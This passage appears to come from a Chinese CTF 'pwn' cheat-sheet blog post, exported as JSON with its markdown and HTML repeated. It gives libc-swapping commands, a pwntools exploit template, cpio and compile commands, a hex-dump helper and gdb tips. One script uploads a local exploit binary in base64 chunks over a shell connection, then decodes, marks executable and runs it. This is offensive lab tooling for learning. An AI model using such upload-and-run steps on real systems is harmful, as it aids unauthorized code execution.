p.recvuntil(\"/ $\")\n    \n    p.sendline(\"cat /tmp/b64_exp | base64 -d > /tmp/exploit\")\n    p.sendline(\"chmod +x /tmp/exploit\")\n    p.sendline(\"/tmp/exploit \")\n    break\n\np.interactive()\n```\n\n[kernelpwn常用库](./kernelpwn.h)\n\n## kernel指令\n\n```sh\n# 打包cpio\nfind . | cpio -o -H newc > ../core.cpio\n# 静态编译exp\ngcc ./exp.c -o exp -static -masm=intel\n```\n\n## 通用printf_binary\n\n```c\n// this is a universal function to print binary data from a char* array\nvoid print_binary(char* buf, int length){\n\tint index = 0;\n\tchar output_buffer[80];\n\tmemset(output_buffer, '\\0', 80);\n\tmemset(output_buffer, ' ', 0x10);\n\tfor(int i=0; i<(length % 16 == 0 ? length / 16 : length / 16 + 1); i++){\n\t\tchar temp_buffer[0x10];\n\t\tmemset(temp_buffer, '\\0', 0x10);\n\t\tsprintf(temp_buffer, \"%#5x\", index);\n\t\tstrcpy(output_buffer, temp_buffer);\n\t\toutput_buffer[5] = ' ';\n\t\toutput_buffer[6] = '|';\n\t\toutput_buffer[7] = ' ';\n\t\tfor(int j=0; j<16; j++){\n\t\t\tif(index+j >= length)\n\t\t\t\tsprintf(output_buffer+8+3*j, \"   \");\n\t\t\telse{\n\t\t\t\tsprintf(output_buffer+8+3*j, \"%02x \", ((int)buf[index+j]) & 0xFF);\n\t\t\t\tif(!isprint(buf[index+j]))\n\t\t\t\t\toutput_buffer[58+j] = '.';\n\t\t\t\telse\n\t\t\t\t\toutput_buffer[58+j] = buf[index+j];\n\t\t\t}\n\t\t}\n\t\toutput_buffer[55] = ' ';\n\t\toutput_buffer[56] = '|';\n\t\toutput_buffer[57] = ' ';\n\t\tprintf(\"%s\\n\", output_buffer);\n\t\tmemset(output_buffer+58, '\\0', 16);\n\t\tindex += 16;\n\t}\n}\n```\n\n## gdb带源码调试\n\n首先下载glibc源代码\n\n在gdb中输入命令`directory /usr/src/glibc/glibc-2.31/...`\n\n使用命令`l # list`可以显示源码，debug界面也能看到。\n","slug":"Misc","published":1,"updated":"2023-03-23T09:42:04.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clg9czafc00185ouddurjamu2","content":"<p>pwn的一些杂七杂八的命令</p>\n<span id=\"more\"></span>\n\n<h2 id=\"杂项\"><a href=\"#杂项\" class=\"headerlink\" title=\"杂项\"></a>杂项</h2><p>更换libc</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">patchelf --set-interpreter /home/a1ph0nse/tools/glibc-all-in-one/libs/2.31-0ubuntu9.7_amd64/ld-2.31.so --set-rpath /home/a1ph0nse/tools/glibc-all-in-one/libs/2.31-0ubuntu9.7_amd64/ filename</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 高版本libc用ld-linux-x86-64.so.2，除此之外还要</span></span><br><span class=\"line\">sudo <span class=\"built_in\">cp</span> -r /home/a1ph0nse/tools/glibc-all-in-one/libs/2.35-0ubuntu3.1_amd64/.debug/.build-id/* /usr/lib/debug/.build-id/</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"exp模板\"><a href=\"#exp模板\" class=\"headerlink\" title=\"exp模板\"></a>exp模板</h2><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span>*</span><br><span class=\"line\">context(log_level=<span class=\"string\">&#x27;debug&#x27;</span>,os=<span class=\"string\">&#x27;linux&#x27;</span>,arch=<span class=\"string\">&#x27;amd64&#x27;</span>)</span><br><span class=\"line\">filename=<span class=\"string\">&#x27;&#x27;</span></span><br><span class=\"line\">elf=ELF(<span class=\"string\">&#x27;./&#x27;</span>+filename)</span><br><span class=\"line\"><span class=\"comment\">#libc=ELF(&#x27;&#x27;)</span></span><br><span class=\"line\">p=process(<span class=\"string\">&#x27;./&#x27;</span>+filename)</span><br><span class=\"line\"><span class=\"comment\">#p=process([&quot;qemu-arm&quot;,&quot;-L&quot;,&quot;...&quot;,&quot;-g&quot;, &quot;8888&quot;, &quot;./&quot;+filename])</span></span><br><span class=\"line\"><span class=\"comment\">#p=process([&#x27;./ld-2.23.so&#x27;,&#x27;./&#x27;+filename],env=&#123;&#x27;LD_PRELOAD&#x27;:&#x27;./libc-2.23.so&#x27;&#125;)</span></span><br><span class=\"line\"><span class=\"comment\">#p=remote(&#x27;&#x27;,)</span></span><br><span class=\"line\"></span><br><span class=\"line\">s       = <span class=\"keyword\">lambda</span> data               :p.send(data)</span><br><span class=\"line\">sl      = <span class=\"keyword\">lambda</span> data               :p.sendline(data)</span><br><span class=\"line\">r       = <span class=\"keyword\">lambda</span> num=<span class=\"number\">4096</span>           :p.recv(num)</span><br><span class=\"line\">rl      = <span class=\"keyword\">lambda</span> num=<span class=\"number\">4096</span>           :p.recvline(num)</span><br><span class=\"line\">ru      = <span class=\"keyword\">lambda</span> x                  :p.recvuntil(x)</span><br><span class=\"line\">itr     = <span class=\"keyword\">lambda</span>                    :p.interactive()</span><br><span class=\"line\">uu32    = <span class=\"keyword\">lambda</span> data               :u32(data.ljust(<span class=\"number\">4</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">uu64    = <span class=\"keyword\">lambda</span> data               :u64(data.ljust(<span class=\"number\">8</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">leak    = <span class=\"keyword\">lambda</span> name,addr          :log.success(<span class=\"string\">&#x27;&#123;&#125; = &#123;&#125;&#x27;</span>.<span class=\"built_in\">format</span>(name, addr))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">debug</span>(<span class=\"params\">cmd=<span class=\"string\">&#x27;\\n&#x27;</span></span>):</span><br><span class=\"line\">  gdb.attach(p,cmd)</span><br><span class=\"line\">  pause()</span><br><span class=\"line\">    </span><br><span class=\"line\"></span><br><span class=\"line\">itr()</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>远程脚本</p>\n<figure class=\"highlight py\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">import</span> base64</span><br><span class=\"line\"><span class=\"comment\">#context.log_level = &quot;debug&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">with</span> <span class=\"built_in\">open</span>(<span class=\"string\">&quot;./exp&quot;</span>, <span class=\"string\">&quot;rb&quot;</span>) <span class=\"keyword\">as</span> f:</span><br><span class=\"line\">    exp = base64.b64encode(f.read())</span><br><span class=\"line\"></span><br><span class=\"line\">p = remote(<span class=\"string\">&quot;127.0.0.1&quot;</span>, <span class=\"number\">11451</span>)</span><br><span class=\"line\"><span class=\"comment\">#p = process(&#x27;./run.sh&#x27;)</span></span><br><span class=\"line\">try_count = <span class=\"number\">1</span></span><br><span class=\"line\"><span class=\"keyword\">while</span> <span class=\"literal\">True</span>:</span><br><span class=\"line\">    p.sendline()</span><br><span class=\"line\">    p.recvuntil(<span class=\"string\">&quot;/ $&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    count = <span class=\"number\">0</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">0</span>, <span class=\"built_in\">len</span>(exp), <span class=\"number\">0x200</span>):</span><br><span class=\"line\">        p.sendline(<span class=\"string\">&quot;echo -n \\&quot;&quot;</span> + exp[i:i + <span class=\"number\">0x200</span>].decode() + <span class=\"string\">&quot;\\&quot; &gt;&gt; /tmp/b64_exp&quot;</span>)</span><br><span class=\"line\">        count += <span class=\"number\">1</span></span><br><span class=\"line\">        log.info(<span class=\"string\">&quot;count: &quot;</span> + <span class=\"built_in\">str</span>(count))</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(count):</span><br><span class=\"line\">        p.recvuntil(<span class=\"string\">&quot;/ $&quot;</span>)</span><br><span class=\"line\">    </span><br><span class=\"line\">    p.sendline(<span class=\"string\">&quot;cat /tmp/b64_exp | base64 -d &gt; /tmp/exploit&quot;</span>)</span><br><span class=\"line\">    p.sendline(<span class=\"string\">&quot;chmod +x /tmp/exploit&quot;</span>)</span><br><span class=\"line\">    p.sendline(<span class=\"string\">&quot;/tmp/exploit &quot;</span>)</span><br><span class=\"line\">    <span class=\"keyword\">break</span></span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n\n<p><a href=\"./kernelpwn.h\">kernelpwn常用库</a></p>\n<h2 id=\"kernel指令\"><a href=\"#kernel指令\" class=\"headerlink\" title=\"kernel指令\"></a>kernel指令</h2><figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 打包cpio</span></span><br><span class=\"line\">find . | cpio -o -H newc &gt; ../core.cpio</span><br><span class=\"line\"><span class=\"comment\"># 静态编译exp</span></span><br><span class=\"line\">gcc ./exp.c -o exp -static -masm=intel</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"通用printf-binary\"><a href=\"#通用printf-binary\" class=\"headerlink\" title=\"通用printf_binary\"></a>通用printf_binary</h2><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// this is a universal function to print binary data from a char* array</span></span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">print_binary</span><span class=\"params\">(<span class=\"type\">char</span>* buf, <span class=\"type\">int</span> length)</span>&#123;</span><br><span class=\"line\">\t<span class=\"type\">int</span> index = <span class=\"number\">0</span>;</span><br><span class=\"line\">\t<span class=\"type\">char</span> output_buffer[<span class=\"number\">80</span>];</span><br><span class=\"line\">\t<span class=\"built_in\">memset</span>(output_buffer, <span class=\"string\">&#x27;\\0&#x27;</span>, <span class=\"number\">80</span>);</span><br><span class=\"line\">\t<span class=\"built_in\">memset</span>(output_buffer, <span class=\"string\">&#x27; &#x27;</span>, <span class=\"number\">0x10</span>);</span><br><span class=\"line\">\t<span class=\"keyword\">for</span>(<span class=\"type\">int</span> i=<span class=\"number\">0</span>; i&lt;(length % <span class=\"number\">16</span> == <span class=\"number\">0</span> ? length / <span class=\"number\">16</span> : length / <span class=\"number\">16</span> + <span class=\"number\">1</span>); i++)&#123;</span><br><span class=\"line\">\t\t<span class=\"type\">char</span> temp_buffer[<span class=\"number\">0x10</span>];</span><br><span class=\"line\">\t\t<span class=\"built_in\">memset</span>(temp_buffer, <span class=\"string\">&#x27;\\0&#x27;</span>, <span class=\"number\">0x10</span>);</span><br><span class=\"line\">\t\t<span class=\"built_in\">sprintf</span>(temp_buffer, <span class=\"string\">&quot;%#5x&quot;</span>, index);</span><br><span class=\"line\">\t\t<span class=\"built_in\">strcpy</span>(output_buffer, temp_buffer);</span><br><span class=\"line\">\t\toutput_buffer[<span class=\"number\">5</span>] = <span class=\"string\">&#x27; &#x27;</span>;</span><br><span class=\"line\">\t\toutput_buffer[<span class=\"number\">6</span>] = <span class=\"string\">&#x27;|&#x27;</span>;</span><br><span class=\"line\">\t\toutput_buffer[<span class=\"number\">7</span>] = <span class=\"string\">&#x27; &#x27;</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">for</span>(<span class=\"type\">int</span> j=<span class=\"number\">0</span>; j&lt;<span class=\"number\">16</span>; j++)&#123;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span>(index+j &gt;= length)</span><br><span class=\"line\">\t\t\t\t<span class=\"built_in\">sprintf</span>(output_buffer+<span class=\"number\">8</span>+<span class=\"number\">3</span>*j, <span class=\"string\">&quot;   &quot;</span>);</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">\t\t\t\t<span class=\"built_in\">sprintf</span>(output_buffer+<span class=\"number\">8</span>+<span class=\"number\">3</span>*j, <span class=\"string\">&quot;%02x &quot;</span>, ((<span class=\"type\">int</span>)buf[index+j]) &amp; <span class=\"number\">0xFF</span>);</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">if</span>(!<span class=\"built_in\">isprint</span>(buf[index+j]))</span><br><span class=\"line\">\t\t\t\t\toutput_buffer[<span class=\"number\">58</span>+j] = <span class=\"string\">&#x27;.&#x27;</span>;</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">else</span></span><br><span class=\"line\">\t\t\t\t\toutput_buffer[<span class=\"number\">58</span>+j] = buf[index+j];</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\toutput_buffer[<span class=\"number\">55</span>] = <span class=\"string\">&#x27; &#x27;</span>;</span><br><span class=\"line\">\t\toutput_buffer[<span class=\"number\">56</span>] = <span class=\"string\">&#x27;|&#x27;</span>;</span><br><span class=\"line\">\t\toutput_buffer[<span class=\"number\">57</span>] = <span class=\"string\">&#x27; &#x27;</span>;</span><br><span class=\"line\">\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%s\\n&quot;</span>, output_buffer);</span><br><span class=\"line\">\t\t<span class=\"built_in\">memset</span>(output_buffer+<span class=\"number\">58</span>, <span class=\"string\">&#x27;\\0&#x27;</span>, <span class=\"number\">16</span>);</span><br><span class=\"line\">\t\tindex += <span class=\"number\">16</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"gdb带源码调试\"><a href=\"#gdb带源码调试\" class=\"headerlink\" title=\"gdb带源码调试\"></a>gdb带源码调试</h2><p>首先下载glibc源代码</p>\n<p>在gdb中输入命令<code>directory /usr/src/glibc/glibc-2.31/...</code></p>\n<p>使用命令<code>l # list</code>可以显示源码，debug界面也能看到。</p>\n","site":{"data":{}},"excerpt":"<p>pwn的一些杂七杂八的命令</p>","more":"<h2 id=\"杂项\"><a href=\"#杂项\" class=\"headerlink\" title=\"杂项\"></a>杂项</h2><p>更换libc</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">patchelf --set-interpreter /home/a1ph0nse/tools/glibc-all-in-one/libs/2.31-0ubuntu9.7_amd64/ld-2.31.so --set-rpath /home/a1ph0nse/tools/glibc-all-in-one/libs/2.31-0ubuntu9.7_amd64/ filename</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 高版本libc用ld-linux-x86-64.so.2，除此之外还要</span></span><br><span class=\"line\">sudo <span class=\"built_in\">cp</span> -r /home/a1ph0nse/tools/glibc-all-in-one/libs/2.35-0ubuntu3.1_amd64/.debug/.build-id/* /usr/lib/debug/.build-id/</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"exp模板\"><a href=\"#exp模板\" class=\"headerlink\" title=\"exp模板\"></a>exp模板</h2><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span>*</span><br><span class=\"line\">context(log_level=<span class=\"string\">&#x27;debug&#x27;</span>,os=<span class=\"string\">&#x27;linux&#x27;</span>,arch=<span class=\"string\">&#x27;amd64&#x27;</span>)</span><br><span class=\"line\">filename=<span class=\"string\">&#x27;&#x27;</span></span><br><span class=\"line\">elf=ELF(<span class=\"string\">&#x27;./&#x27;</span>+filename)</span><br><span class=\"line\"><span class=\"comment\">#libc=ELF(&#x27;&#x27;)</span></span><br><span class=\"line\">p=process(<span class=\"string\">&#x27;./&#x27;</span>+filename)</span><br><span class=\"line\"><span class=\"comment\">#p=process([&quot;qemu-arm&quot;,&quot;-L&quot;,&quot;...&quot;,&quot;-g&quot;, &quot;8888&quot;, &quot;./&quot;+filename])</span></span><br><span class=\"line\"><span class=\"comment\">#p=process([&#x27;./ld-2.23.so&#x27;,&#x27;./&#x27;+filename],env=&#123;&#x27;LD_PRELOAD&#x27;:&#x27;./libc-2.23.so&#x27;&#125;)</span></span><br><span class=\"line\"><span class=\"comment\">#p=remote(&#x27;&#x27;,)</span></span><br><span class=\"line\"></span><br><span class=\"line\">s       = <span class=\"keyword\">lambda</span> data               :p.send(data)</span><br><span class=\"line\">sl      = <span class=\"keyword\">lambda</span> data               :p.sendline(data)</span><br><span class=\"line\">r       = <span class=\"keyword\">lambda</span> num=<span class=\"number\">4096</span>           :p.recv(num)</span><br><span class=\"line\">rl      = <span class=\"keyword\">lambda</span> num=<span class=\"number\">4096</span>           :p.recvline(num)</span><br><span class=\"line\">ru      = <span class=\"keyword\">lambda</span> x                  :p.recvuntil(x)</span><br><span class=\"line\">itr     = <span class=\"keyword\">lambda</span>                    :p.interactive()</span><br><span class=\"line\">uu32    = <span class=\"keyword\">lambda</span> data               :u32(data.ljust(<span class=\"number\">4</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">uu64    = <span class=\"keyword\">lambda</span> data               :u64(data.ljust(<span class=\"number\">8</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">leak    = <span class=\"keyword\">lambda</span> name,addr          :log.success(<span class=\"string\">&#x27;&#123;&#125; = &#123;&#125;&#x27;</span>.<span class=\"built_in\">format</span>(name, addr))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">debug</span>(<span class=\"params\">cmd=<span class=\"string\">&#x27;\\n&#x27;</span></span>):</span><br><span class=\"line\">  gdb.attach(p,cmd)</span><br><span class=\"line\">  pause()</span><br><span class=\"line\">    </span><br><span class=\"line\"></span><br><span class=\"line\">itr()</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>远程脚本</p>\n<figure class=\"highlight py\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">import</span> base64</span><br><span class=\"line\"><span class=\"comment\">#context.log_level = &quot;debug&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">with</span> <span class=\"built_in\">open</span>(<span class=\"string\">&quot;./exp&quot;</span>, <span class=\"string\">&quot;rb&quot;</span>) <span class=\"keyword\">as</span> f:</span><br><span class=\"line\">    exp = base64.b64encode(f.read())</span><br><span class=\"line\"></span><br><span class=\"line\">p = remote(<span class=\"string\">&quot;127.0.0.1&quot;</span>, <span class=\"number\">11451</span>)</span><br><span class=\"line\"><span class=\"comment\">#p = process(&#x27;./run.sh&#x27;)</span></span><br><span class=\"line\">try_count = <span class=\"number\">1</span></span><br><span class=\"line\"><span class=\"keyword\">while</span> <span class=\"literal\">True</span>:</span><br><span class=\"line\">    p.sendline()</span><br><span class=\"line\">    p.recvuntil(<span class=\"string\">&quot;/ $&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    count = <span class=\"number\">0</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">0</span>, <span class=\"built_in\">len</span>(exp), <span class=\"number\">0x200</span>):</span><br><span class=\"line\">        p.sendline(<span class=\"string\">&quot;echo -n \\&quot;&quot;</span> + exp[i:i + <span class=\"number\">0x200</span>].decode() + <span class=\"string\">&quot;\\&quot; &gt;&gt; /tmp/b64_exp&quot;</span>)</span><br><span class=\"line\">        count += <span class=\"number\">1</span></span><br><span class=\"line\">        log.info(<span class=\"string\">&quot;count: &quot;</span> + <span class=\"built_in\">str</span>(count))</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(count):</span><br><span class=\"line\">        p.recvuntil(<span class=\"string\">&quot;/ $&quot;</span>)</span><br><span class=\"line\">    </span><br><span class=\"line\">    p.sendline(<span class=\"string\">&quot;cat /tmp/b64_exp | base64 -d &gt; /tmp/exploit&quot;</span>)</span><br><span class=\"line\">    p.sendline(<span class=\"string\">&quot;chmod +x /tmp/exploit&quot;</span>)</span><br><span class=\"line\">    p.sendline(<span class=\"string\">&quot;/tmp/exploit &quot;</span>)</span><br><span class=\"line\">    <span class=\"keyword\">break</span></span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n\n<p><a href=\"./kernelpwn.h\">kernelpwn常用库</a></p>\n<h2 id=\"kernel指令\"><a href=\"#kernel指令\" class=\"headerlink\" title=\"kernel指令\"></a>kernel指令</h2><figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 打包cpio</span></span><br><span class=\"line\">find . | cpio -o -H newc &gt; ../core.cpio</span><br><span class=\"line\"><span class=\"comment\"># 静态编译exp</span></span><br><span class=\"line\">gcc ./exp.c -o exp -static -masm=intel</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"通用printf-binary\"><a href=\"#通用printf-binary\" class=\"headerlink\" title=\"通用printf_binary\"></a>通用printf_binary</h2><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// this is a universal function to print binary data from a char* array</span></span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">print_binary</span><span class=\"params\">(<span class=\"type\">char</span>* buf, <span class=\"type\">int</span> length)</span>&#123;</span><br><span class=\"line\">\t<span class=\"type\">int</span> index = <span class=\"number\">0</span>;</span><br><span class=\"line\">\t<span class=\"type\">char</span> output_buffer[<span class=\"number\">80</span>];</span><br><span class=\"line\">\t<span class=\"built_in\">memset</span>(output_buffer, <span class=\"string\">&#x27;\\0&#x27;</span>, <span class=\"number\">80</span>);</span><br><span class=\"line\">\t<span class=\"built_in\">memset</span>(output_buffer, <span class=\"string\">&#x27; &#x27;</span>, <span class=\"number\">0x10</span>);</span><br><span class=\"line\">\t<span class=\"keyword\">for</span>(<span class=\"type\">int</span> i=<span class=\"number\">0</span>; i&lt;(length % <span class=\"number\">16</span> == <span class=\"number\">0</span> ? length / <span class=\"number\">16</span> : length / <span class=\"number\">16</span> + <span class=\"number\">1</span>); i++)&#123;</span><br><span class=\"line\">\t\t<span class=\"type\">char</span> temp_buffer[<span class=\"number\">0x10</span>];</span><br><span class=\"line\">\t\t<span class=\"built_in\">memset</span>(temp_buffer, <span class=\"string\">&#x27;\\0&#x27;</span>, <span class=\"number\">0x10</span>);</span><br><span class=\"line\">\t\t<span class=\"built_in\">sprintf</span>(temp_buffer, <span class=\"string\">&quot;%#5x&quot;</span>, index);</span><br><span class=\"line\">\t\t<span class=\"built_in\">strcpy</span>(output_buffer, temp_buffer);</span><br><span class=\"line\">\t\toutput_buffer[<span class=\"number\">5</span>] = <span class=\"string\">&#x27; &#x27;</span>;</span><br><span class=\"line\">\t\toutput_buffer[<span class=\"number\">6</span>] = <span class=\"string\">&#x27;|&#x27;</span>;</span><br><span class=\"line\">\t\toutput_buffer[<span class=\"number\">7</span>] = <span class=\"string\">&#x27; &#x27;</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">for</span>(<span class=\"type\">int</span> j=<span class=\"number\">0</span>; j&lt;<span class=\"number\">16</span>; j++)&#123;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span>(index+j &gt;= length)</span><br><span class=\"line\">\t\t\t\t<span class=\"built_in\">sprintf</span>(output_buffer+<span class=\"number\">8</span>+<span class=\"number\">3</span>*j, <span class=\"string\">&quot;   &quot;</span>);</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">\t\t\t\t<span class=\"built_in\">sprintf</span>(output_buffer+<span class=\"number\">8</span>+<span class=\"number\">3</span>*j, <span class=\"string\">&quot;%02x &quot;</span>, ((<span class=\"type\">int</span>)buf[index+j]) &amp; <span class=\"number\">0xFF</span>);</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">if</span>(!<span class=\"built_in\">isprint</span>(buf[index+j]))</span><br><span 